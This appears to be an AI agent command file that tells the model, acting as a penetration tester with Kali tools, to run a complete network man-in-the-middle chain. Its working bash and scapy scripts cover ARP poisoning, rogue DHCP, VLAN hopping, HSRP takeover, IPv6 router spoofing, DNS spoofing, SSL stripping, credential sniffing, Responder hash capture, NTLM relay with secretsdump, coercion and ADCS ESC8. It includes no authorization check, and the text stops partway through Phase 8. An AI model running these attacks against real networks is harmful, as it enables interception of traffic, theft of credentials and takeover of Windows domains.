---
description: Network MITM attack suite — ARP poisoning, DNS spoofing, SSL stripping, credential sniffing, responder LLMNR/NBT-NS, NTLM relay to shell/secretsdump, IPv6 MITM (mitm6), WPAD injection
argument-hint: <interface> [target-ip] [gateway-ip] (e.g. eth0 192.168.1.50 192.168.1.1)
allowed-tools: [mcp__kali-pentest__execute_kali_command, mcp__kali-pentest__execute_parallel]
---

# pt-mitm — Network Man-in-the-Middle Attack Suite

You are an expert network penetration tester. From a position on the local network, execute a full MITM attack chain: establish an ARP poison position between the target and gateway, sniff credentials from all protocols, poison LLMNR/NBT-NS to capture NTLMv2 hashes, relay NTLM authentication to gain shells or dump credentials, and use IPv6 to bypass defenses. Every phase builds on the last — passive sniff → active MITM → relay → shell.

---

## Step 0 — Parse Arguments & Setup

`$ARGUMENTS` = `<interface> [target-ip] [gateway-ip]`
- `IFACE` = first argument (required, e.g. `eth0`)
- `TARGET_IP` = second argument (optional — if omitted, MITM entire subnet)
- `GATEWAY_IP` = third argument (optional — auto-detected if omitted)

```bash
IFACE=<interface>
TARGET_IP="${2:-}"   # optional
GATEWAY_IP="${3:-}"  # optional
ENG=/home/kali/current
KALI_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | head -1)
SUBNET=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+/\d+' | head -1 | sed 's|\.[0-9]*/|.0/|')
mkdir -p $ENG/{loot/{hashes,credentials,pcaps},poc/requests,scans} 2>/dev/null

# Auto-detect gateway if not provided
[ -z "$GATEWAY_IP" ] && GATEWAY_IP=$(ip route | grep default | awk '{print $3}' | head -1)
# Auto-detect domain for IPv6 MITM
DOMAIN=$(cat /etc/resolv.conf 2>/dev/null | grep "search\|domain" | awk '{print $2}' | head -1)
[ -z "$DOMAIN" ] && DOMAIN="corp.local"

echo "=== pt-mitm Setup ==="
echo "  Interface : $IFACE"
echo "  Kali IP   : $KALI_IP"
echo "  Subnet    : $SUBNET"
echo "  Gateway   : $GATEWAY_IP"
echo "  Target    : ${TARGET_IP:-ALL HOSTS (subnet-wide)}"
echo "  Domain    : $DOMAIN"
echo ""

# Enable IP forwarding (CRITICAL — without this, you'll drop traffic and DoS the target)
echo "--- Enabling IP forwarding ---"
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward | grep -q "1" && echo "  [+] IP forwarding: ENABLED" || echo "  [-] IP forwarding FAILED"

# Check required tools
echo ""
echo "--- Tool availability ---"
for tool in bettercap responder ntlmrelayx.py arpspoof; do
    which $tool 2>/dev/null && echo "  [+] $tool" || echo "  [-] $tool (install: apt install -y bettercap dsniff)"
done
which mitm6 2>/dev/null && echo "  [+] mitm6" || echo "  [-] mitm6 (install: pip3 install mitm6)"
```

---

## Phase 1 — Passive Network Reconnaissance (Sniff Before Attacking)

Always start passively — understand what's on the network before active attacks:

```bash
IFACE=<interface>
ENG=/home/kali/current

echo "=== [Phase 1] Passive Sniff (30 seconds) ==="
echo "Identifying hosts, protocols, and any plain-text credentials..."
echo ""

# bettercap passive probe — discovers all hosts + their traffic patterns
timeout 30 bettercap -iface "$IFACE" -eval "
set log.output $ENG/loot/pcaps/bettercap_passive.log;
net.probe on;
net.sniff on;
sleep 25;
quit
" 2>/dev/null | grep -E "host|credential|password|user|login|plain" | head -30

echo ""
echo "--- ARP table (all discovered hosts) ---"
arp -a 2>/dev/null | grep -v "incomplete" | head -30

echo ""
echo "--- Listening for plain-text protocols (tcpdump 30s) ---"
timeout 30 tcpdump -i "$IFACE" -A -s 0 \
    'port 21 or port 23 or port 25 or port 110 or port 143 or port 80' \
    2>/dev/null | grep -iE "user|pass|login|auth|bearer|basic" | head -20 &

# Also listen for SMB/NTLM authentication attempts
timeout 30 tcpdump -i "$IFACE" -A -s 0 'port 445 or port 139' 2>/dev/null | \
    grep -iE "ntlm|negotiate|auth" | head -10
```

---

## Phase 2 — ARP Poisoning (MITM Position)

Insert Kali between the target and gateway so all traffic flows through us:

```bash
IFACE=<interface>
TARGET_IP=<target_ip_or_subnet>
GATEWAY_IP=<gateway_ip>
ENG=/home/kali/current

echo "=== [Phase 2] ARP Poisoning ==="
echo "Inserting between $TARGET_IP and $GATEWAY_IP..."
echo ""

# bettercap is the cleanest ARP spoof tool — handles gratuitous ARPs, supports subnet-wide
cat > /tmp/arp_spoof.cap << EOF
set arp.spoof.targets $TARGET_IP
set arp.spoof.fullduplex true
set arp.spoof.internal true
arp.spoof on
net.sniff on
set net.sniff.verbose true
set net.sniff.output $ENG/loot/pcaps/mitm_capture.pcap
EOF

echo "Starting bettercap ARP spoof (run in background job)..."
echo "bettercap -iface $IFACE -caplet /tmp/arp_spoof.cap"
echo ""
echo "Alternatively, use arpspoof (two terminals needed):"
echo "  Terminal 1: arpspoof -i $IFACE -t $TARGET_IP $GATEWAY_IP"
echo "  Terminal 2: arpspoof -i $IFACE -t $GATEWAY_IP $TARGET_IP"
echo ""

# Start bettercap ARP spoof in background
bettercap -iface "$IFACE" -eval "
set arp.spoof.targets $TARGET_IP;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on;
set net.sniff.output $ENG/loot/pcaps/mitm_capture.pcap;
" 2>/dev/null &
BETTERCAP_PID=$!
echo "bettercap PID: $BETTERCAP_PID (kill when done)"
echo ""
echo "Verifying MITM position (wait 10s)..."
sleep 10
arp -a | grep "$TARGET_IP" | grep -q "$KALI_IP" && \
    echo "  [+] ARP cache poisoned — MITM position established" || \
    echo "  [-] ARP poison not confirmed yet (may take 30s)"
```

---

## Phase 2b — DHCP Starvation + Rogue DHCP (Stealthier than ARP)

DHCP-based MITM is cleaner than ARP spoofing — no gratuitous ARPs to alert IDS, and every new
host automatically uses Kali as gateway and DNS:

```bash
IFACE=<interface>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 2b] DHCP Starvation + Rogue DHCP ==="
echo ""

# Step 1: Exhaust the legitimate DHCP server's address pool
echo "--- Step 1: DHCP pool exhaustion (200 fake DISCOVER packets) ---"
which yersinia 2>/dev/null && {
    echo "Using yersinia (GUI: select DHCP → Attack 1)..."
    timeout 30 yersinia dhcp -attack 1 -interface "$IFACE" 2>/dev/null || \
        echo "Run: yersinia -G   (GUI → DHCP → 'send RAW packet' flood)"
} || {
    echo "Using scapy DHCP flood..."
    python3 << 'EOF'
from scapy.all import *
import random, time

print("Flooding DHCP with fake MACs...")
for i in range(300):
    mac = ':'.join(['%02x' % random.randint(0,255) for _ in range(6)])
    mac_bytes = bytes.fromhex(mac.replace(':', ''))
    pkt = (Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
           IP(src='0.0.0.0', dst='255.255.255.255') /
           UDP(sport=68, dport=67) /
           BOOTP(chaddr=mac_bytes, xid=random.randint(0, 0xffffffff)) /
           DHCP(options=[('message-type', 'discover'), 'end']))
    sendp(pkt, iface=None, verbose=0)
    time.sleep(0.05)
print(f"DHCP pool exhaustion complete ({300} packets sent)")
EOF
}

echo ""
echo "--- Step 2: Serve rogue DHCP (Kali as gateway + DNS) ---"
# All new DHCP requests go to us — we route as gateway (automatic MITM)
KALI_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+' | head -1)
SUBNET_BASE=$(echo "$KALI_IP" | cut -d. -f1-3)

cat > /tmp/rogue_dhcp.conf << EOF
interface=$IFACE
dhcp-range=${SUBNET_BASE}.150,${SUBNET_BASE}.200,255.255.255.0,12h
dhcp-option=3,$KALI_IP
dhcp-option=6,$KALI_IP
dhcp-option=252,http://$KALI_IP/wpad.dat
server=8.8.8.8
log-queries
log-dhcp
EOF

dnsmasq -C /tmp/rogue_dhcp.conf --pid-file=/tmp/rogue_dhcp.pid 2>/dev/null &
echo "Rogue DHCP started — new hosts use Kali as gateway + DNS"
echo "Advantages over ARP spoof: no ARP anomalies, persists across client reconnects, affects all new clients"
echo ""
echo "Monitor new DHCP leases: tail -f /var/log/syslog | grep DHCP"
echo "Kill: kill \$(cat /tmp/rogue_dhcp.pid)"
```

---

## Phase 2c — VLAN Hopping (802.1Q Double Tagging)

Reach management VLANs that are supposed to be unreachable:

```bash
IFACE=<interface>
ENG=/home/kali/current

echo "=== [Phase 2c] VLAN Hopping ==="
echo ""

# Check if DTP (Dynamic Trunking Protocol) is active on our switch port
echo "--- DTP trunk negotiation attack ---"
which yersinia 2>/dev/null && {
    echo "Running yersinia DTP attack (make our port a trunk)..."
    timeout 10 yersinia -I 2>/dev/null || echo "GUI: yersinia -G → 802.1Q → DTP Attack"
}

echo ""
echo "--- 802.1Q double-tagging probe ---"
echo "Outer VLAN = native VLAN (untagged on trunk). Inner VLAN = target (unreachable management VLAN)."
echo "Switch strips outer tag and forwards inner-tagged frame to management VLAN."
echo ""

# Double-tag attack with scapy
python3 << 'VLANEOF'
from scapy.all import *
import sys

iface = "$IFACE"
outer_vlan = 1    # native VLAN (untagged on trunk) — change to match switch config
inner_vlan = 10   # management VLAN target — try 10, 20, 100, 200

print(f"Sending double-tagged frames: outer VLAN {outer_vlan} → inner VLAN {inner_vlan}")
print("If switch accepts trunk → management VLAN traffic accessible from Kali")

# Send probes to management VLAN hosts
for dst_ip in [f"192.168.{inner_vlan}.1", f"10.{inner_vlan}.0.1", f"172.16.{inner_vlan}.1"]:
    pkt = (Ether(dst='ff:ff:ff:ff:ff:ff') /
           Dot1Q(vlan=outer_vlan) /
           Dot1Q(vlan=inner_vlan) /
           IP(dst=dst_ip, src='192.168.1.100') /
           ICMP())
    sendp(pkt, iface=iface, verbose=0)
    print(f"  Probe sent to {dst_ip} via VLAN {inner_vlan}")

# Sniff for responses from management VLAN
print("Listening for responses from management VLAN (5 seconds)...")
result = sniff(iface=iface, timeout=5, filter=f"vlan {inner_vlan}", count=5)
if result:
    print(f"  [+] Got {len(result)} responses from VLAN {inner_vlan}!")
    result.show()
else:
    print(f"  No responses. Try different outer_vlan={outer_vlan} (must match switch native VLAN)")
VLANEOF

echo ""
echo "If VLAN hopping works:"
echo "  → Add sub-interface: ip link add link $IFACE name $IFACE.10 type vlan id 10"
echo "  → Bring it up: ip link set $IFACE.10 up && dhclient $IFACE.10"
echo "  → Scan management VLAN: /pt-net $IFACE.10"
```

---

## Phase 2d — HSRP/VRRP Gateway Takeover

Become the active router on networks using Cisco HSRP or standard VRRP:

```bash
IFACE=<interface>
ENG=/home/kali/current

echo "=== [Phase 2d] HSRP/VRRP Gateway Takeover ==="
echo ""

# Detect HSRP/VRRP traffic first
echo "--- Sniffing for HSRP/VRRP advertisements ---"
echo "HSRP sends Hellos to 224.0.0.2 on UDP 1985 every 3 seconds"
echo "VRRP sends Advertisements to 224.0.0.18 on protocol 112"
timeout 15 tcpdump -i "$IFACE" -nn '(udp port 1985) or (proto 112)' 2>/dev/null | \
    head -10 | tee /tmp/hsrp_detected.txt

if grep -q "1985\|VRRP\|224.0.0" /tmp/hsrp_detected.txt 2>/dev/null; then
    echo "[!] HSRP/VRRP traffic detected — network uses redundant gateways!"
    VIRTUAL_GW=$(tcpdump -i "$IFACE" -nn 'udp port 1985' -c 3 2>/dev/null | \
        grep -oP '\d+\.\d+\.\d+\.\d+' | tail -1)
    echo "  Virtual gateway: $VIRTUAL_GW"

    echo ""
    echo "--- HSRP takeover with yersinia ---"
    which yersinia 2>/dev/null && \
        echo "GUI: yersinia -G → HSRP → 'Becoming Active Router'" || \
        echo "Install: apt install -y yersinia"

    echo ""
    echo "--- HSRP takeover with scapy (priority 255 beats all) ---"
    python3 << 'HSRPEOF'
from scapy.all import *
import time, sys

iface = "$IFACE"
kali_ip = "$KALI_IP"
virtual_ip = "$VIRTUAL_GW" or "192.168.1.1"

print(f"Sending HSRP Hello with priority 255 (highest = becomes active router)")
print(f"Target virtual gateway: {virtual_ip}")
print("Ctrl+C to stop. Allow 10-15 seconds for holdtime to expire.")

try:
    while True:
        # HSRP version 1 Hello with priority 255
        pkt = (Ether(dst='01:00:5e:00:00:02', src=get_if_hwaddr(iface)) /
               IP(src=kali_ip, dst='224.0.0.2', ttl=1) /
               UDP(sport=1985, dport=1985) /
               Raw(load=bytes([0,       # version 1
                               0,       # hello message type
                               3,       # state: active
                               255,     # priority (255 = highest possible)
                               3, 0,    # hellotime, holdtime
                               0, 0,    # reserved
                               0xc0,0xa8,0x01,0x01,  # group virtual IP
                               0,0,0,0  # auth (none)
                               ])))
        sendp(pkt, iface=iface, verbose=0)
        time.sleep(3)
except KeyboardInterrupt:
    print("Stopped. If takeover succeeded, add virtual IP to interface:")
    print(f"  ip addr add {virtual_ip}/24 dev {iface}")
HSRPEOF
fi
```

---

## Phase 2e — ICMPv6 Router Advertisement Spoofing

Faster than mitm6 — immediately routes all IPv6 traffic through Kali:

```bash
IFACE=<interface>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 2e] ICMPv6 Router Advertisement Spoofing ==="
echo ""
echo "Send fake IPv6 Router Advertisements — all hosts auto-configure Kali as IPv6 router."
echo "Works instantly (no DHCPv6 needed, no waiting for LLMNR queries)."
echo "Combine with ntlmrelayx for immediate NTLM hash relay."
echo ""

# Enable IPv6 forwarding
echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
echo 1 > /proc/sys/net/ipv6/conf/"$IFACE"/forwarding
echo "[+] IPv6 forwarding enabled"

# Get Kali's link-local address
KALI_LL=$(ip -6 addr show "$IFACE" scope link 2>/dev/null | grep -oP '(?<=inet6 )[^/]+' | head -1)
[ -z "$KALI_LL" ] && KALI_LL="fe80::1"
KALI_MAC=$(cat /sys/class/net/$IFACE/address 2>/dev/null)
echo "Kali link-local: $KALI_LL ($KALI_MAC)"

# Send Router Advertisements in background
python3 << 'RAEOF' &
from scapy.all import *
import time

iface = "$IFACE"
kali_mac = "$KALI_MAC"
kali_ll = "$KALI_LL"

print(f"Broadcasting IPv6 Router Advertisements every 5s (Kali = IPv6 default router)")
print(f"All hosts will auto-configure {kali_ll} as their IPv6 default gateway")

while True:
    ra = (Ether(src=kali_mac, dst='33:33:00:00:00:01') /
          IPv6(src=kali_ll, dst='ff02::1', hlim=255) /
          ICMPv6ND_RA(routerlifetime=9000, reachabletime=30000, retranstimer=1000) /
          ICMPv6NDOptSrcLLAddr(lladdr=kali_mac) /
          ICMPv6NDOptPrefixInfo(
              prefix='2001:db8::', prefixlen=64,
              L=1, A=1,
              validlifetime=86400, preferredlifetime=14400))
    sendp(ra, iface=iface, verbose=0)
    time.sleep(5)
RAEOF

RA_PID=$!
echo "Router Advertisement loop PID: $RA_PID"
echo ""
echo "All IPv6-capable hosts will now route IPv6 through Kali within ~10 seconds."
echo "Combine with NTLM relay for immediate hash capture:"
echo "  ntlmrelayx.py -6 -t ldaps://<dc-ip> --delegate-access --add-computer"
echo ""
echo "Monitor IPv6 neighbors: ip -6 neigh show dev $IFACE"
```

---

## Phase 3 — DNS Spoofing

Once in MITM position, redirect DNS queries to Kali-hosted services:

```bash
IFACE=<interface>
TARGET_IP=<target_ip>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 3] DNS Spoofing ==="
echo ""

# Configure bettercap DNS spoof
# Redirect all *.corp.local, *.internal → Kali (for credential harvesting page)
bettercap -iface "$IFACE" -eval "
set dns.spoof.all true;
set dns.spoof.domains *.corp.local,*.internal,*.local,update.microsoft.com,windowsupdate.microsoft.com;
set dns.spoof.address $KALI_IP;
dns.spoof on;
" 2>/dev/null &

echo "DNS spoof targets: *.corp.local, *.internal, *.local → $KALI_IP"
echo ""
echo "--- Set up phishing HTTP server (optional) ---"
echo "# Quick HTTP server to capture credentials:"
echo "  python3 -m http.server 80 -d /var/www/html/"
echo ""
echo "# Or start Apache with credential capture:"
echo "  systemctl start apache2"
echo "  # Serve a cloned login page and log POSTed credentials"
echo ""
echo "--- Verify DNS spoofing from target (if you have shell) ---"
echo "  nslookup corp.local <target-ip>  # should resolve to $KALI_IP"
```

---

## Phase 4 — SSL Stripping

Downgrade HTTPS to HTTP to capture plain-text credentials:

```bash
IFACE=<interface>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 4] SSL Stripping ==="
echo ""

# bettercap hstshijack — most effective SSL strip technique
# Requires ARP poison to be active (Phase 2)
cat > /tmp/hstshijack.cap << 'EOF'
# hstshijack SSL strip caplet
set hstshijack.log /tmp/hstshijack.log
set hstshijack.ignore *
set hstshijack.targets corp.com,example.com,*.corp.local
set hstshijack.replacements corp.com:corp.corn,example.com:example.corn
set hstshijack.strip.credentials true
hstshijack/hstshijack
EOF

# Check if hstshijack caplet is available
ls /usr/share/bettercap/caplets/hstshijack/ 2>/dev/null && {
    echo "Starting SSL stripping via hstshijack..."
    bettercap -iface "$IFACE" -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap 2>/dev/null &
} || {
    echo "hstshijack not found. Using sslstrip..."
    # iptables redirect to sslstrip
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
    sslstrip -l 10000 -w $ENG/loot/pcaps/sslstrip.log 2>/dev/null &
    echo "sslstrip running on port 10000"
}

echo ""
echo "Monitoring for stripped HTTPS credentials..."
tail -f $ENG/loot/pcaps/sslstrip.log 2>/dev/null | grep -iE "user|pass|login|auth" &
```

---

## Phase 5 — Credential Sniffing

Capture all plain-text credentials crossing our MITM position:

```bash
IFACE=<interface>
ENG=/home/kali/current

echo "=== [Phase 5] Credential Sniffing ==="
echo ""

# bettercap net.sniff — auto-extracts credentials from many protocols
bettercap -iface "$IFACE" -eval "
net.sniff on;
set net.sniff.verbose true;
set net.sniff.regexp .*password.*|.*passwd.*|.*user.*|.*login.*;
set net.sniff.output $ENG/loot/pcaps/credentials.pcap;
" 2>/dev/null | tee $ENG/loot/credentials/sniffed_creds.txt | \
grep -iE "password|passwd|user|login|auth|credential|bearer" &

echo "Sniffing credentials from:"
echo "  FTP (port 21)  — plain-text USER/PASS"
echo "  Telnet (23)    — plain-text login"
echo "  HTTP (80)      — Basic auth, POST form data"
echo "  SMTP (25/587)  — AUTH PLAIN, EHLO/MAIL"
echo "  POP3 (110)     — USER/PASS"
echo "  IMAP (143)     — LOGIN command"
echo ""
echo "Credential output → $ENG/loot/credentials/sniffed_creds.txt"
echo ""

# Also run tcpdump for raw PCAP analysis
tcpdump -i "$IFACE" -w "$ENG/loot/pcaps/full_capture_$(date +%Y%m%d_%H%M).pcap" \
    -s 65535 2>/dev/null &
echo "Full PCAP → $ENG/loot/pcaps/ (analyze offline with Wireshark or strings)"
```

---

## Phase 6 — Responder (LLMNR/NBT-NS/MDNS Poisoning)

Poison Windows name resolution to capture NTLMv2 hashes without any MITM position needed:

```bash
IFACE=<interface>
ENG=/home/kali/current

echo "=== [Phase 6] Responder — LLMNR/NBT-NS Poisoning ==="
echo ""
echo "Responder poisons LLMNR/NBT-NS/MDNS lookups for non-existent hosts."
echo "Every Windows machine that looks up a share (\\\\fileserver\\, \\\\backup\\, etc.)"
echo "and gets a NXDOMAIN response will trigger Responder's fake server."
echo "Result: NTLMv2 hash captured for every Windows user on the network."
echo ""

# Backup Responder config (don't serve SMB/HTTP if relaying in Phase 7)
cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak 2>/dev/null

echo "Starting Responder..."
responder -I "$IFACE" -rdwPF 2>/dev/null | \
    tee $ENG/loot/hashes/responder_output.txt | \
    grep -E "NTLMv2|NTLMv1|Hash:|Captured" &

RESPONDER_PID=$!
echo "Responder PID: $RESPONDER_PID"
echo ""
echo "Captured hashes → /usr/share/responder/logs/ and $ENG/loot/hashes/responder_output.txt"
echo ""
echo "To crack captured NTLMv2 hashes:"
echo "  hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt -r best64.rule"
echo "  john --format=netntlmv2 /usr/share/responder/logs/SMB-NTLMv2-*.txt --wordlist=/usr/share/wordlists/rockyou.txt"
echo ""
echo "Monitor hash captures (live):"
echo "  watch -n2 'ls -la /usr/share/responder/logs/*.txt 2>/dev/null | tail -5'"
```

---

## Phase 7 — NTLM Relay (Hash → Shell without Cracking)

Instead of cracking hashes, relay them directly to other hosts for instant access:

```bash
IFACE=<interface>
GATEWAY_IP=<gateway_ip>
SUBNET=<subnet>
ENG=/home/kali/current

echo "=== [Phase 7] NTLM Relay Attack ==="
echo ""
echo "When Responder captures NTLM auth, relay it directly to other SMB/LDAP targets."
echo "Result: shell or secretsdump WITHOUT needing to crack the hash."
echo ""

# IMPORTANT: Disable Responder's SMB and HTTP servers before relaying
# (Otherwise Responder serves instead of relaying)
sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf 2>/dev/null
sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf 2>/dev/null
echo "[!] Disabled Responder SMB+HTTP servers (required for relay)"

# Build target list — all hosts in subnet with SMB signing disabled
echo "--- Finding relay targets (SMB signing not required) ---"
netexec smb "$SUBNET" --gen-relay-list $ENG/loot/relay_targets.txt 2>/dev/null
echo "Relay targets (SMB signing NOT enforced):"
cat $ENG/loot/relay_targets.txt 2>/dev/null | head -20
echo ""

# Start ntlmrelayx in background
echo "Starting ntlmrelayx.py..."
echo "Option A: Relay to SMB → shell"
echo "  ntlmrelayx.py -tf $ENG/loot/relay_targets.txt -smb2support --shell cmd"
echo ""
echo "Option B: Relay to SMB → secretsdump (credential dump)"
echo "  ntlmrelayx.py -tf $ENG/loot/relay_targets.txt -smb2support --secretsdump"
echo ""
echo "Option C: Relay to LDAP → create user or add to admins"
echo "  ntlmrelayx.py -tf ldap://<dc-ip> -smb2support --escalate-user <compromised-user>"
echo ""

# Start ntlmrelayx (secretsdump mode by default)
ntlmrelayx.py \
    -tf "$ENG/loot/relay_targets.txt" \
    -smb2support \
    --secretsdump \
    -of $ENG/loot/hashes/relayed_hashes.txt \
    2>/dev/null | tee $ENG/loot/hashes/ntlmrelayx_output.txt | \
    grep -E "Administrator|hash|relayed|SUCCEED|shell" &

RELAY_PID=$!
echo "ntlmrelayx PID: $RELAY_PID"
echo ""
echo "Now restart Responder (with SMB/HTTP OFF) to feed ntlmrelayx:"
echo "  responder -I $IFACE -rdw 2>/dev/null"
echo ""
echo "Dumped hashes → $ENG/loot/hashes/relayed_hashes.txt"
echo "Relay log → $ENG/loot/hashes/ntlmrelayx_output.txt"
```

---

## Phase 7b — Coercion Attacks (Force Windows Auth Instantly)

Unlike Responder (which waits for random LLMNR queries), coercion attacks **force** any Windows
host to authenticate to Kali immediately — no user interaction, no waiting:

```bash
IFACE=<interface>
TARGET=<target_dc_or_windows_host>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 7b] Coercion Attacks — Force Windows Auth ==="
echo ""
echo "Strategy: start ntlmrelayx, then coerce targets → instant relay without waiting"
echo ""

# IMPORTANT: Disable Responder SMB/HTTP servers before relaying
sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf 2>/dev/null
sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf 2>/dev/null

# Build relay target list
SUBNET=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+\.\d+\.\d+\.\d+/\d+' | head -1 | sed 's|\.[0-9]*/|.0/|')
netexec smb "$SUBNET" --gen-relay-list $ENG/loot/relay_targets.txt 2>/dev/null
echo "Relay targets (SMB signing disabled): $(wc -l < $ENG/loot/relay_targets.txt 2>/dev/null)"

# Start ntlmrelayx ready to receive coerced auth
echo "Starting ntlmrelayx (secretsdump mode)..."
ntlmrelayx.py \
    -tf "$ENG/loot/relay_targets.txt" \
    -smb2support \
    --secretsdump \
    -of $ENG/loot/hashes/coerced_hashes.txt \
    2>/dev/null | tee $ENG/loot/hashes/coerce_relay.txt | \
    grep -E "SUCCEED|Administrator|hash|relayed" &
RELAY_PID=$!
sleep 2

# --- PetitPotam (EFSRPC — no authentication required!) ---
echo ""
echo "--- PetitPotam (EFSRPC coercion — NO CREDS NEEDED) ---"
PETITPOTAM=$(which petitpotam.py 2>/dev/null || echo "/opt/PetitPotam/PetitPotam.py")
[ -f "$PETITPOTAM" ] && {
    python3 "$PETITPOTAM" "$KALI_IP" "$TARGET" 2>/dev/null | tail -5
    echo "  [!] PetitPotam sent — check ntlmrelayx output for relayed auth"
} || {
    echo "  Install: git clone https://github.com/topotam/PetitPotam /opt/PetitPotam"
    echo "  Run: python3 /opt/PetitPotam/PetitPotam.py $KALI_IP $TARGET"
}

# --- PrinterBug (MS-RPRN — needs ANY valid domain creds) ---
echo ""
echo "--- PrinterBug (MS-RPRN Print Spooler) ---"
echo "  Needs valid creds (even guest): python3 /opt/impacket/examples/printerbug.py 'DOMAIN/user:pass@$TARGET' $KALI_IP"
echo "  Or via netexec: netexec smb $TARGET -u <user> -p <pass> -M spooler"
# Try with null session first
ntlmrelayx_test=$(netexec smb $TARGET -u '' -p '' -M spooler 2>/dev/null | grep -i "spooler\|running")
[ -n "$ntlmrelayx_test" ] && echo "  Print Spooler status: $ntlmrelayx_test"

# --- DFSCoerce (MS-DFSNM — works on DCs even when PetitPotam is patched) ---
echo ""
echo "--- DFSCoerce (MS-DFSNM) ---"
DFSCOERCE=$(which dfscoerce.py 2>/dev/null || echo "/opt/DFSCoerce/dfscoerce.py")
[ -f "$DFSCOERCE" ] && \
    echo "  Run: python3 $DFSCOERCE -u <user> -p <pass> -d <domain> $KALI_IP $TARGET" || \
    echo "  Install: git clone https://github.com/dirkjanm/DFSCoerce /opt/DFSCoerce"

echo ""
echo "Monitor coercion results: tail -f $ENG/loot/hashes/coerce_relay.txt"
echo "If relay succeeds → SAM/NTDS dump saved to $ENG/loot/hashes/coerced_hashes.txt"
```

---

## Phase 7c — WinRM Relay + Active Directory Certificate Services

```bash
TARGET=<target_host>
DC_IP=<domain_controller_ip>
KALI_IP=<kali_ip>
ENG=/home/kali/current

echo "=== [Phase 7c] WinRM Relay + ADCS ESC8 ==="
echo ""

# --- WinRM relay (get PowerShell instead of SMB shell) ---
echo "--- WinRM relay → direct PowerShell session ---"
echo "WinRM relay works when SMB signing is required (blocks SMB relay)."
echo ""
echo "Starting ntlmrelayx targeting WinRM..."
ntlmrelayx.py \
    -t "winrm://$TARGET" \
    -smb2support \
    2>/dev/null | tee $ENG/loot/hashes/winrm_relay.txt | \
    grep -E "SUCCEED|session|shell" &
WINRM_PID=$!
echo "ntlmrelayx WinRM PID: $WINRM_PID"
echo "Coerce $TARGET to auth: python3 /opt/PetitPotam/PetitPotam.py $KALI_IP $TARGET"
echo "When relay succeeds, connect: evil-winrm -i $TARGET -u <user> -H <ntlm-hash>"
echo ""

# --- ADCS ESC8 relay (relay to Certificate Authority for cert-based persistence) ---
echo "--- ADCS ESC8 — relay to Active Directory Certificate Services ---"
echo ""

# Find the CA
echo "Finding Certificate Authority..."
CA_HOST=$(netexec ldap "$DC_IP" -u '' -p '' -M adcs 2>/dev/null | \
    grep -oP '(?<=Certificate Authority: )[^\s]+' | head -1)
[ -z "$CA_HOST" ] && CA_HOST="$DC_IP"
echo "  CA: $CA_HOST"
echo ""

# Check if CA's HTTP enrollment endpoint is up
CA_ENROLL=$(curl -sk -o /dev/null -w "%{http_code}" \
    --max-time 5 "http://$CA_HOST/certsrv/" 2>/dev/null)
echo "  CA enrollment endpoint (HTTP): $CA_ENROLL"

[ "$CA_ENROLL" != "000" ] && {
    echo "  [+] CA enrollment endpoint accessible — ADCS ESC8 attack possible!"
    echo ""
    echo "  Step 1: Start ntlmrelayx targeting ADCS enrollment endpoint:"
    echo "    ntlmrelayx.py -t 'http://$CA_HOST/certsrv/certfnsh.asp' -smb2support --adcs --template DomainController"
    echo ""
    echo "  Step 2: Coerce the DC to authenticate to Kali:"
    echo "    python3 /opt/PetitPotam/PetitPotam.py $KALI_IP $DC_IP"
    echo ""
    echo "  Step 3: ntlmrelayx will request a DomainController cert for the DC machine account"
    echo "  Step 4: Use the cert to get the DC's NT hash:"
    echo "    certipy auth -pfx dc.pfx -dc-ip $DC_IP"
    echo "    → NT hash of DC machine account → DCSYNC → entire domain"
    echo ""
    echo "  Alternative: Rubeus (Windows) - asktgt /user:DC$ /certificate:dc.pfx /ptt"
}
```

---

## Phase 8 — IPv6 MITM (Bypass LLMNR Defenses)

Many networks have disabled LLMNR/NBT-NS but forget IPv6. This attack works even on hardened networks:

```bash
IFACE=<interface>
DOMAIN=<domain>
ENG=/home/kali/current

echo "=== [Phase 8] IPv6 MITM via mitm6 ==="
echo ""
echo "mitm6 abuses the Windows IPv6 configuration (even when LLMNR is disabled)."
echo "It responds to DHCPv6 requests to assign itself as the IPv6 DNS server."
echo "Result: all DNS queries → Kali → WPAD PAC file → all HTTP goes through Kali."
echo "Combined with ntlmrelayx: captures credentials from every Windows host, even admins."
echo ""

# Check if mitm6 is installed
which mitm6 2>/dev/null || {
    echo "mitm6 not found. Installing..."
    pip3 install mitm6 2>/dev/null || echo "Install manually: pip3 install mitm6"
}

# Start ntlmrelayx for LDAPS relay (needed for IPv6 attack)
echo "--- Starting ntlmrelayx for LDAPS (AD credential/session capture) ---"
DC_IP=$(nslookup -type=SRV _ldap._tcp.$DOMAIN 2>/dev/null | grep "internet address" | awk '{print $NF}' | head -1)
echo "DC IP: $DC_IP"

ntlmrelayx.py \
    -6 \
    -t "ldaps://$DC_IP" \
    -smb2support \
    --delegate-access \
    --add-computer \
    -of $ENG/loot/hashes/ipv6_relay_hashes.txt \
    2>/dev/null | tee $ENG/loot/hashes/ipv6_ntlmrelayx.txt | \
    grep -E "SUCCEED|delegate|computer|hash|shell" &

RELAY6_PID=$!
